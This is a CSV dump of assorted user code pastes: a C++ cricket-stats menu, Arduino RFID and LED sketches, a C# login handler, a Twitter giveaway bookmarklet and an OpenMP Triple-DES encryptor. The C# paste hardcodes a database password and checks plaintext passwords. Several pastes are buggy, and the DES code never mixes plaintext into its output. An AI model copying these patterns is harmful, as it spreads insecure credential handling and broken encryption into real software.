id,title,username,language,date,content
2ueGthpK,final project,apl-mhd,C++,Thursday 9th of May 2024 06:29:31 AM CDT,"#include <stdio.h>
#include <stdlib.h>

struct Player
{
    char name[100];
    int age;
    char playerRole[100];
    int match;
    int totalRuns;
    int highestRun;
};

void addPlayer(FILE *file, struct Player *playerList, int n)
{
    char newline;

    for (int i = 0; i < n; i++)
    {

        fscanf(file, ""%c"", &newline);
        fscanf(file, ""%c"", &newline);

        fgets(playerList[i].name, 100, file);
        fscanf(file, ""%d"", &playerList[i].age);
        fscanf(file, ""%c"", &newline);
        fgets(playerList[i].playerRole, 100, file);
        fscanf(file, ""%d"", &playerList[i].match);
        fscanf(file, ""%d"", &playerList[i].totalRuns);
        fscanf(file, ""%d"", &playerList[i].highestRun);
    }
}

void printPlayer(struct Player player)
{
    printf(""Full Name: %s"", player.name);
    printf(""Age: %d \n"", player.age);
    printf(""Player Role: %s"", player.playerRole);

    printf(""ODI Match: %d \n"", player.match);
    printf(""Total Runs: %d \n"", player.totalRuns);
    printf(""Highest Run: %d \n\n"", player.highestRun);
}

void playerInfo(struct Player playerList[], char name[], int n)
{
    int index;
    for (int i = 0; i < n; i++)
    {
        index = i;
        int j = -1;
        while (playerList[i].name[j] != '\0')
        {
            if (playerList[i].name != name[j])
            {
                index = -1;
                break;
            }
            {
            }
            j++;
        }

        if (index != -1)
        {
            break;
        }
    }

    printPlayer(playerList[index]);
}

void showAllPlayer(struct Player playerList[], int n)
{
    printf(""All player: \n\n"");

    for (int i = 0; i < n; i++)
    {
        printf(""\n--------Player %d--------\n"", i + 1);
        printPlayer(playerList[i]);
    };
}

void mep(struct Player playerList[], int n)
{
    printf(""MOST Experienced Player: \n\n"");
    int index = -1;
    int maxMatch = -1;
    for (int i = 0; i < n; i++)
    {
        if (playerList[i].match > maxMatch)
        {
            maxMatch = playerList[i].match;
            index = i;
        }
    }

    printPlayer(playerList[index]);
}

void ncp(struct Player playerList[], int n)
{
    printf(""New Commer Player: \n\n"");
    int index = -1;
    int age = 999999;
    for (int i = 0; i < n; i++)
    {
        if (playerList[i].age < age)
        {
            age = playerList[i].age;
            index = i;
        }
    }

    printPlayer(playerList[index]);
}

void tsp(struct Player playerList[], int n)
{
    printf(""Top Scorer Player: \n\n"");
    int index = -1;
    int totalRuns = -1;
    for (int i = 0; i < n; i++)
    {
        if (playerList[i].totalRuns > totalRuns)
        {
            totalRuns = playerList[i].totalRuns;
            index = i;
        }
    }

    printPlayer(playerList[index]);
}

void hhp(struct Player playerList[], int n)
{
    printf(""Hard Hitter Player: \n\n"");
    int index = -1;
    int avgRun = -1;
    for (int i = 0; i < n; i++)
    {
        int temp = playerList[i].totalRuns / playerList[i].match;
        if (temp > avgRun)
        {
            avgRun = playerList[i].totalRuns;
            index = i;
        }
    }

    printPlayer(playerList[index]);
}

void hrtp(struct Player playerList[], int n)
{
    printf(""Highest Run Taker PlayerL \n\n"");

    int index = -1;
    int highestRun = -1;
    for (int i = 0; i < n; i++)
    {
        if (playerList[i].highestRun > highestRun)
        {
            highestRun = playerList[i].highestRun;
            index = i;
        }
    }

    printPlayer(playerList[index]);
}

void mvp(struct Player playerList[], int n)
{
    printf(""MOST Valuable Player: \n\n"");

    int index = -1;
    int value = -1;
    for (int i = 0; i < n; i++)
    {
        int age = playerList[i].age;
        int match = playerList[i].match;
        int totalRuns = playerList[i].totalRuns;
        int highestRun = playerList[i].highestRun;

        int j = 0;
        char playerRoll[100] = {'A', 'l', 'l', 'r', 'o', 'u', 'n', 'd', 'e', 'r'};
        int allRounderValue = 50;

        while (playerList[i].playerRole[j] != '\n')
        {
            if (playerRoll[j] != playerList[i].playerRole[j])
            {
                allRounderValue = 0;
                break;
            }

            j++;
        }

        int temp = age + match + totalRuns + highestRun + (totalRuns / match) + (highestRun / age) + allRounderValue;
        if (temp > value)
        {
            value = temp;
            index = i;
        }
    }

    printPlayer(playerList[index]);
}

void allRounder(struct Player playerList[], int n)
{
    printf(""Allrounders: \n\n"");
    for (int i = 0; i < n; i++)
    {
        int j = 0;
        int index = i;
        char playerRoll[100] = {'A', 'l', 'l', 'r', 'o', 'u', 'n', 'd', 'e', 'r'};

        while (playerList[i].playerRole[j] != '\n')
        {
            if (playerRoll[j] != playerList[i].playerRole[j])
            {
                index = -1;
                break;
            }

            j++;
        }

        if (index != -1)
        {
            printPlayer(playerList[index]);
        }
    }
}

int main()
{
    char fileName[100];
    printf(""Enter File Name: "");
    scanf(""%s"", fileName);
    FILE *file;
    file = fopen(fileName, ""r"");

    int n;
    char name[100];
    struct Player playerList[100];

    fscanf(file, ""%d"", &n);

    addPlayer(file, playerList, n);

    int menu = 1;

    while (menu)
    {
        printf(""1. All Players\n"");
        printf(""2. Show A Particular player information (Provide Player Name)\n"");
        printf(""3. Show the MOST Experienced Player(MEP) \n"");
        printf(""4. Show the New Commer Player(NCP)\n"");
        printf(""5. Show the Top Scorer Player(TSP)\n"");
        printf(""6. Show the Hard Hitter Player(HHP)\n"");
        printf(""7. Show the Highest Run Taker Player(HRTP)\n"");
        printf(""8. Show the MOST Valuable Player(MVP)\n"");
        printf(""9. Show the Allrounders\n"");
        printf(""10.Exit/Quit\n"");

        scanf(""%d"", &menu);

        if (menu == 1)
        {
            showAllPlayer(playerList, n);
        }
        if (menu == 2)
        {
            playerInfo(playerList, name, n);
        }
        if (menu == 3)
        {
            mep(playerList, n);
        }
        if (menu == 4)
        {
            ncp(playerList, n);
        }
        if (menu == 5)
        {
            tsp(playerList, n);
        }
        if (menu == 6)
        {
            hhp(playerList, n);
        }
        if (menu == 7)
        {
            hrtp(playerList, n);
        }
        if (menu == 8)
        {
            mvp(playerList, n);
        }
        if (menu == 9)
        {
            allRounder(playerList, n);
        }
        if (menu == 10)
        {
            menu = 0;
            break;
        }
    }

    fclose(file);

    return 0;
}"
Ug0T8Fps,RFID Scanner rev_03,pleasedontcode,Arduino,Thursday 9th of May 2024 06:05:09 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: RFID Scanner
	- Source Code compiled for: ESP32 DevKit V1
	- Source Code created on: 2024-05-09 11:03:51

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* RC522 scan card and store card number */
/****** END SYSTEM REQUIREMENTS *****/


/****** DEFINITION OF LIBRARIES *****/
#include <Wire.h>
#include <MFRC522.h>

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF I2C PINS *****/
const uint8_t Sceen_LCD1602I2C_I2C_PIN_SDA_D21 = 21;
const uint8_t Sceen_LCD1602I2C_I2C_PIN_SCL_D22 = 22;
const uint8_t Sceen_LCD1602I2C_I2C_SLAVE_ADDRESS = 39;

// Create an instance of the MFRC522 library
MFRC522 mfrc522(/*SS pin*/ 5, /*RST pin*/ 0); // Change SS and RST pins as needed

void setup(void)
{
  // put your setup code here, to run once:
  Serial.begin(9600);
  SPI.begin(); // Init SPI bus
  mfrc522.PCD_Init(); // Init MFRC522 card

  Serial.println(""Scan a RFID card"");
}

void loop(void)
{
  // put your main code here, to run repeatedly:
  // Look for new cards
  if (mfrc522.PICC_IsNewCardPresent() && mfrc522.PICC_ReadCardSerial())
  {
    Serial.println(""A card is detected!"");
    // Print UID of the card
    Serial.print(""Card UID:"");
    for (byte i = 0; i < mfrc522.uid.size; i++)
    {
      Serial.print(mfrc522.uid.uidByte[i] < 0x10 ? "" 0"" : "" "");
      Serial.print(mfrc522.uid.uidByte[i], HEX);
    }
    Serial.println();
    mfrc522.PICC_HaltA(); // Halt PICC
  }
}

/* END CODE */"
bvPMfQak,"3 LEDs, different speed",jgoy,C++,Thursday 9th of May 2024 06:01:50 AM CDT,"#define LED_ROOD 25  // GPIO pin van LED
#define LED_GEEL 26
#define LED_GROEN 27

#define ROOD_TIJD 3131  // interval in milliseconden
#define GEEL_TIJD 1117
#define GROEN_TIJD 200

void setup() {
  pinMode(LED_ROOD, OUTPUT);
  pinMode(LED_GEEL, OUTPUT);
  pinMode(LED_GROEN, OUTPUT);
}

void loop() {
  digitalWrite(LED_ROOD, millis() % ROOD_TIJD * 2 < ROOD_TIJD ? HIGH : LOW);
  digitalWrite(LED_GEEL, millis() % GEEL_TIJD * 2 < GEEL_TIJD ? HIGH : LOW);
  digitalWrite(LED_GROEN, millis() % GROEN_TIJD * 2 < GROEN_TIJD ? HIGH : LOW);
}"
4CZ3TP21,data921,TestGuy1,JSON,Thursday 9th of May 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '67a055dacd7a09e7e3afe6cd3926c1c534241a80a6ee57cc71811e38d09757acb7f5d31374abee9a61d348aa3cb491c2e321ea5e78edbcc5667c0402aa051d6c3d751b7453cc2420d56134ac1fe896b1b4a388b3101a3641bcdca24f059a685c43fddbd6730502a834f9fa4739d0ae913bce06aa129e1349560fe15e5e6a916b',
  otherdata: [
    '696b0ff83f992490d999d76a92ac06ea',
    'd16415bee0153eb7c7d698fa0ba7f7f8',
    '788a37d950c6c3ece276d080b6574475',
    '2b5ae8e92395f34574398e6ca593e7d4',
    'c5fa2fba956bd25f2dd2dd7de74f1413',
    'b2f4a57af7347f8519ff392375f58c19',
    '2ac3eda2ff13e5de5b9c4eab2f41b4b4',
    'f674bab4ce037f03cdff87fa70d01fce'
  ]
}"
2C4xNyVL,RFID Scanner rev_02,pleasedontcode,Arduino,Thursday 9th of May 2024 05:57:02 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: RFID Scanner
	- Source Code NOT compiled for: ESP32 DevKit V1
	- Source Code created on: 2024-05-09 10:56:36

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* RC522 scan card and store card number */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <Wire.h>
#include <MFRC522.h>

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF I2C PINS *****/
const uint8_t Sceen_LCD1602I2C_I2C_PIN_SDA_D21 = 21;
const uint8_t Sceen_LCD1602I2C_I2C_PIN_SCL_D22 = 22;
const uint8_t Sceen_LCD1602I2C_I2C_SLAVE_ADDRESS = 39;

// Create an instance of the MFRC522 library
MFRC522 mfrc522(/*SS pin*/ 5, /*RST pin*/ 0); // Change SS and RST pins as needed

void setup(void)
{
  // put your setup code here, to run once:
  Serial.begin(9600);
  SPI.begin(); // Init SPI bus
  mfrc522.PCD_Init(); // Init MFRC522 card

  Serial.println(""Scan a RFID card"");
}

void loop(void)
{
  // put your main code here, to run repeatedly:
  // Look for new cards
  if (mfrc522.PICC_IsNewCardPresent() && mfrc522.PICC_ReadCardSerial())
  {
    Serial.println(""A card is detected!"");
    // Print UID of the card
    Serial.print(""Card UID:"");
    for (byte i = 0; i < mfrc522.uid.size; i++)
    {
      Serial.print(mfrc522.uid.uidByte[i] < 0x10 ? "" 0"" : "" "");
      Serial.print(mfrc522.uid.uidByte[i], HEX);
    }
    Serial.println();
    mfrc522.PICC_HaltA(); // Halt PICC
  }
}

/* END CODE */"
pqDMePst,RFID Reader rev_01,pleasedontcode,Arduino,Thursday 9th of May 2024 05:55:27 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: RFID Reader
	- Source Code NOT compiled for: ESP32 DevKit V1
	- Source Code created on: 2024-05-09 10:54:01

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* RC522 scan cards */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <Wire.h>
#include <MFRC522.h>  // Include the MFRC522 library

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF I2C PINS *****/
const uint8_t Sceen_LCD1602I2C_I2C_PIN_SDA_D21 = 21;
const uint8_t Sceen_LCD1602I2C_I2C_PIN_SCL_D22 = 22;
const uint8_t Sceen_LCD1602I2C_I2C_SLAVE_ADDRESS = 39;

// Create an instance of the MFRC522 library
MFRC522 mfrc522(/*SS pin*/ 5, /*RST pin*/ 4);  // Change the SS and RST pins as per your wiring

void setup(void)
{
  // put your setup code here, to run once:
  Serial.begin(9600);
  SPI.begin(); // Init SPI bus
  mfrc522.PCD_Init(); // Init MFRC522 card

  Serial.println(""Scan RFID card to get the UID..."");
}

void loop(void)
{
  // put your main code here, to run repeatedly:
  // Look for new cards
  if (mfrc522.PICC_IsNewCardPresent() && mfrc522.PICC_ReadCardSerial())
  {
    // Show UID on serial monitor
    Serial.print(""UID tag :"");
    String content = """";
    for (byte i = 0; i < mfrc522.uid.size; i++)
    {
      content.concat(String(mfrc522.uid.uidByte[i] < 0x10 ? "" 0"" : "" ""));
      content.concat(String(mfrc522.uid.uidByte[i], HEX));
    }
    content.toUpperCase();
    Serial.println(content);
  }
}

/* END CODE */"
zTwpM63Z,Untitled,Semount,C#,Thursday 9th of May 2024 05:44:54 AM CDT,"Metod:
private void LoginAction(object obj)
{
    string enteredLogin = Username;
    string enteredPassword = PasswordProvider.Password;

    using (NpgsqlConnection connection = DatabaseConnection.GetConnection())
    {
        connection.Open();

        string query = ""SELECT role_id, name, surname FROM employees WHERE login = @Login AND password = @Password"";
        using (NpgsqlCommand command = new NpgsqlCommand(query, connection))
        {
            command.Parameters.AddWithValue(""@Login"", enteredLogin);
            command.Parameters.AddWithValue(""@Password"", enteredPassword);

            using (var reader = command.ExecuteReader())
            {
                if (reader.Read())
                {
                    int roleId = reader.GetInt32(0);
                    string name = reader.GetString(1);
                    string surname = reader.GetString(2);

                    switch (roleId)
                    {
                        case 1: // Официант
                            Application.Current.Dispatcher.Invoke(() =>
                            {
                                WaiterWindow waiterWindow = new WaiterWindow(name, surname);
                                waiterWindow.Show();
                            });
                            break;
                        case 2: // Повар
                            Application.Current.Dispatcher.Invoke(() =>
                            {
                                ChefWindow chefWindow = new ChefWindow(name, surname);
                                chefWindow.Show();
                            });
                            break;
                        case 3: // Администратор
                            Application.Current.Dispatcher.Invoke(() =>
                            {
                                AdminWindow adminWindow = new AdminWindow(name, surname);
                                adminWindow.Show();
                            });
                            break;
                        default:
                            // Неизвестная роль
                            ShowErrorMessage = true;
                            ErrorMessage = ""Неизвестная роль. Доложите администратору."";
                            break;
                    }
                    // Закрываем текущее окно входа
                    if (obj is Window window)
                    {
                        window.Close();
                    }
                }
                else
                {
                    // Неверный логин или пароль
                    ShowErrorMessage = true;
                    ErrorMessage = ""Неверный логин или пароль."";
                }
            }
        }
    }
}


DatabaseConnection.cs:
using Npgsql;

namespace ReManage.Core
{
    public static class DatabaseConnection
    {
        private static string connectionString = ""Server=localhost;Port=5432;Database=ReManage;User Id=postgres;Password=35x45x;"";

        public static NpgsqlConnection GetConnection()
        {
            return new NpgsqlConnection(connectionString);
        }
    }
}"
VhH947Sp,For Arduino,dllbridge,C,Thursday 9th of May 2024 05:35:33 AM CDT,"#include <SoftwareSerial.h>

SoftwareSerial mySerial(10, 11); // RX, TX
#define LED_PIN 13

void setup() {
  pinMode(LED_PIN, OUTPUT);
  mySerial.begin(9600);
}

void loop() {
  if (mySerial.available()) {
    String inputString = mySerial.readString();
    if (inputString.indexOf(""SONY"") >= 0) {
      digitalWrite(LED_PIN, HIGH);
      mySerial.println(""_Pictures"");
    } else {
      digitalWrite(LED_PIN, LOW);
    }
  }
}



#include <windows.h>
#include <stdio.h>

int main() {
    HANDLE hCom;
    BOOL fSuccess;
    char *pszPortName = ""COM3""; // COM-порт Arduino
    char *pszMessage = ""SONY"";
    DWORD dwNumBytesWritten = 0;
    DWORD dwNumBytesRead = 0;
    char inbuff[10];

    // Открываем COM-порт
    hCom = CreateFile(pszPortName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hCom == INVALID_HANDLE_VALUE) {
        printf(""Failed to open COM: %dn"", GetLastError());
        return 1;
    }

    // Отправляем сообщение
    fSuccess = WriteFile(hCom, pszMessage, strlen(pszMessage), &dwNumBytesWritten, NULL);

    if (!fSuccess) {
        printf(""WriteFile failed: %dn"", GetLastError());
        return 1;
    }
    
    // Получаем ответ
    fSuccess = ReadFile(hCom, inbuff, 10, &dwNumBytesRead, NULL);
    
    if (!fSuccess) {
        printf(""ReadFile failed: %dn"", GetLastError());
        return 1;
    }
    printf(""Received: %sn"", inbuff);

    return 0;
}"
AtSRCUpQ,Twitter Giveaway Picker,MeckeOfficial,JavaScript,Thursday 9th of May 2024 05:10:29 AM CDT,"javascript: (function() {
    let hrefList = [];
    let scrollAttempts = 0;

    function processSections() {
        const sections = document.getElementsByTagName('section');
        for (let i = 0; i < sections.length; i++) {
            const section = sections[i];
            if (section.hasAttribute('aria-labelledby')) {
                const ariaLabelledById = section.getAttribute('aria-labelledby');
                if (ariaLabelledById.startsWith('accessible-list')) {
                    const h1Elements = section.getElementsByTagName('h1');
                    for (let j = 0; j < h1Elements.length; j++) {
                        const h1Element = h1Elements[j];
                        if (h1Element.getAttribute('role') === 'heading' && (h1Element.textContent.trim() === 'Reposts' || h1Element.textContent.trim() === 'Likes' || h1Element.textContent.trim() === 'Quotes')) {
                            const cellInnerDivs = section.querySelectorAll('[data-testid=""cellInnerDiv""]');
                            cellInnerDivs.forEach(cellInnerDiv => {
                                const hrefRegex = /href=""([^""]*)""/;
                                const match = cellInnerDiv.innerHTML.match(hrefRegex);
                                if (match && match[1]) {
                                    const href = match[1];
                                    if (!hrefList.includes(href)) {
                                        hrefList.push(href);
                                        updateHrefsCountDisplay();
                                        console.log(""New href added:"", href);
                                    }
                                }
                            });
                            break;
                        }
                    }
                }
            }
        }
    }

    function pickWinner() {
        if (hrefList.length > 0) {
            const randomIndex = Math.floor(Math.random() * hrefList.length);
            const selectedHref = hrefList[randomIndex];
            winnerButton.textContent = selectedHref;
            winnerButton.href = selectedHref;
            hrefList.splice(randomIndex, 1);
            updateHrefsCountDisplay();
        } else {
            winnerButton.textContent = ""No entries available"";
            winnerButton.removeAttribute('href');
        }
    }

    function handlePickWinner() {
        hrefList = [];
        processSections();
        const scrollInterval = setInterval(function() {
            window.scrollBy(0, window.innerHeight);
            scrollAttempts++;
            if (scrollAttempts >= 3) {
                scrollAttempts = 0;
                const prevLength = hrefList.length;
                processSections();
                if (hrefList.length === prevLength) {
                    clearInterval(scrollInterval);
                    console.log(""Reached end. List of hrefs:"", hrefList);
                    pickWinner();
                }
            }
        }, 1000);
    }

    function handleReroll() {
        pickWinner();
    }

    function updateHrefsCountDisplay() {
        hrefCountDisplay.textContent = `Total hrefs: ${hrefList.length}`;
    }
    const pickWinnerButton = document.createElement('button');
    pickWinnerButton.textContent = 'Pick a Winner';
    pickWinnerButton.addEventListener('click', handlePickWinner);
    document.body.appendChild(pickWinnerButton);
    pickWinnerButton.style.position = 'fixed';
    pickWinnerButton.style.top = '10px';
    pickWinnerButton.style.left = '10px';
    pickWinnerButton.style.backgroundColor = 'green';
    pickWinnerButton.style.color = 'white';
    pickWinnerButton.style.padding = '10px 20px';
    pickWinnerButton.style.border = 'none';
    pickWinnerButton.style.borderRadius = '5px';
    pickWinnerButton.style.cursor = 'pointer';
    const rerollButton = document.createElement('button');
    rerollButton.textContent = 'Reroll';
    rerollButton.addEventListener('click', handleReroll);
    document.body.appendChild(rerollButton);
    rerollButton.style.position = 'fixed';
    rerollButton.style.top = '10px';
    rerollButton.style.left = '150px';
    rerollButton.style.backgroundColor = 'blue';
    rerollButton.style.color = 'white';
    rerollButton.style.padding = '10px 20px';
    rerollButton.style.border = 'none';
    rerollButton.style.borderRadius = '5px';
    rerollButton.style.cursor = 'pointer';
    const winnerButton = document.createElement('a');
    winnerButton.textContent = '- None -';
    document.body.appendChild(winnerButton);
    winnerButton.style.position = 'fixed';
    winnerButton.style.top = '50px';
    winnerButton.style.left = '10px';
    winnerButton.style.backgroundColor = 'blue';
    winnerButton.style.color = 'white';
    winnerButton.style.padding = '10px 20px';
    winnerButton.style.border = 'none';
    winnerButton.style.borderRadius = '5px';
    winnerButton.style.cursor = 'pointer';
    const hrefCountDisplay = document.createElement('span');
    hrefCountDisplay.textContent = `Total hrefs: ${hrefList.length}`;
    document.body.appendChild(hrefCountDisplay);
    hrefCountDisplay.style.position = 'fixed';
    hrefCountDisplay.style.top = '90px';
    hrefCountDisplay.style.left = '10px';
    hrefCountDisplay.style.color = 'black';
})();"
9E07kswb,DES_PAO,cataleena,C++,Thursday 9th of May 2024 05:01:56 AM CDT,"#include <iostream>
#include <fstream>
#include <cstdint>
#include <chrono>
#include <omp.h> // Include OpenMP header
#include ""keys.h""
#include ""permutation.h""
#include ""sbox.h""

class TripleDES {
public:
    TripleDES(const uint64_t* key1, const uint64_t* key2, const uint64_t* key3) : key1(key1), key2(key2), key3(key3) {
        obtainRoundKeys(*key1, roundKeys1, 16);
        obtainRoundKeys(*key2, roundKeys2, 16);
        obtainRoundKeys(*key3, roundKeys3, 16);
    }

    void encryptFile(const char* inputFile, const char* outputFile);
    uint64_t generateNextCounterValue(uint64_t counter);
    uint64_t getMillisTimestamp();

private:
    const uint64_t* key1;
    const uint64_t* key2;
    const uint64_t* key3;
    unsigned long long roundKeys1[16], roundKeys2[16], roundKeys3[16];

    void encryptBlocks(const uint64_t* counter, uint64_t* ciphertextBlock);
};

void TripleDES::encryptFile(const char* inputFile, const char* outputFile) {
    std::ifstream inFile(inputFile, std::ios::binary);
    std::ofstream outFile(outputFile, std::ios::binary);

    if (!inFile.is_open() || !outFile.is_open()) {
        std::cerr << ""Error opening files."" << std::endl;
        return;
    }

    constexpr size_t blockSize = 8; // 64 bits
    uint64_t plaintextBlock[8], ciphertextBlock[8];
    uint64_t counter[8] = {0, 1, 2, 3, 4, 5, 6, 7}; // Initial counter values
    bool keepProcessing = true;

#pragma omp parallel // Start parallel region
    {
        while (keepProcessing) {
            // Read multiple blocks in a thread-safe manner
            bool readSuccessful = true;
#pragma omp critical
            {
                for (int i = 0; i < 8; ++i) {
                    readSuccessful &= inFile.read(reinterpret_cast<char*>(&plaintextBlock[i]), blockSize).good();
                }
            }

            if (!readSuccessful) {
                keepProcessing = false;
            }

            // Encrypt multiple blocks in parallel
            encryptBlocks(counter, ciphertextBlock);

            // Write the ciphertext blocks in a thread-safe manner
#pragma omp critical
            {
                if (keepProcessing) {
                    for (int i = 0; i < 8; ++i) {
                        outFile.write(reinterpret_cast<char*>(&ciphertextBlock[i]), blockSize);
                    }
                }
            }

            // Update the counter after processing the blocks
            for (int i = 0; i < 8; ++i) {
                counter[i] = generateNextCounterValue(counter[i]);
            }
        }
    } // End of parallel region

    inFile.close();
    outFile.close();
}

void TripleDES::encryptBlocks(const uint64_t* counter, uint64_t* ciphertextBlock) {
    // First encryption
#pragma omp simd
    for (int i = 0; i < 8; ++i) {
        uint64_t permutedBlock = performLongToLongPermutation(counter[i], initialPerm, initialPermSize);
        for (int j = 0; j < 16; ++j) {
            unsigned long long expandedBlock = performLongToLongPermutation(permutedBlock, expandRight, expandRightSize);
            unsigned long long xorResult = expandedBlock ^ roundKeys1[j];
            unsigned int sboxResult = performSboxCalculation(xorResult);
            uint64_t permutedSboxResult = performIntToLongPermutation(sboxResult, finalSboxPerm, finalSboxPermSize);
            permutedBlock ^= permutedSboxResult;
        }
        ciphertextBlock[i] = performLongToLongPermutation(permutedBlock, keyPermFinal, keyPermFinalSize);
    }

    // Second encryption
#pragma omp simd
    for (int i = 0; i < 8; ++i) {
        uint64_t permutedBlock = performLongToLongPermutation(ciphertextBlock[i], initialPerm, initialPermSize);
        for (int j = 0; j < 16; ++j) {
            unsigned long long expandedBlock = performLongToLongPermutation(permutedBlock, expandRight, expandRightSize);
            unsigned long long xorResult = expandedBlock ^ roundKeys2[j];
            unsigned int sboxResult = performSboxCalculation(xorResult);
            uint64_t permutedSboxResult = performIntToLongPermutation(sboxResult, finalSboxPerm, finalSboxPermSize);
            permutedBlock ^= permutedSboxResult;
        }
        ciphertextBlock[i] = performLongToLongPermutation(permutedBlock, keyPermFinal, keyPermFinalSize);
    }

    // Third encryption
#pragma omp simd
    for (int i = 0; i < 8; ++i) {
        uint64_t permutedBlock = performLongToLongPermutation(ciphertextBlock[i], initialPerm, initialPermSize);
        for (int j = 0; j < 16; ++j) {
            unsigned long long expandedBlock = performLongToLongPermutation(permutedBlock, expandRight, expandRightSize);
            unsigned long long xorResult = expandedBlock ^ roundKeys3[j];
            unsigned int sboxResult = performSboxCalculation(xorResult);
            uint64_t permutedSboxResult = performIntToLongPermutation(sboxResult, finalSboxPerm, finalSboxPermSize);
            permutedBlock ^= permutedSboxResult;
        }
        ciphertextBlock[i] = performLongToLongPermutation(permutedBlock, keyPermFinal, keyPermFinalSize);
    }
}

uint64_t TripleDES::generateNextCounterValue(uint64_t counter) {
    return counter + 8; // Increment by the number of blocks processed
}

uint64_t TripleDES::getMillisTimestamp() {
    auto now = std::chrono::system_clock::now();
    auto duration = now.time_since_epoch();
    auto millis = std::chrono::duration_cast<std::chrono::milliseconds>(duration).count();
    return millis;
}

int main() {
    const char* inputFile = ""../data/input1MB.txt"";
    const char* outputFile = ""../data/output1MB_encrypted.txt"";
    uint64_t key1[3] = {0xA4B92905A4B92905, 0x0000000000000000, 0xA4B92905A4B92905};
    uint64_t key2[3] = {0xC567A1F3C567A1F3, 0x0000000000000000, 0xC567A1F3C567A1F3};
    uint64_t key3[3] = {0xE3D17F253E3D17F2, 0x0000000000000000, 0xE3D17F253E3D17F2};

    TripleDES des(key1, key2, key3);

    auto begin = des.getMillisTimestamp();
    des.encryptFile(inputFile, outputFile);
    auto end = des.getMillisTimestamp();

    auto duration_ms = end - begin;
    std::cout << ""Encryption completed in "" << duration_ms << "" ms."" << std::endl;

    return 0;
}
"
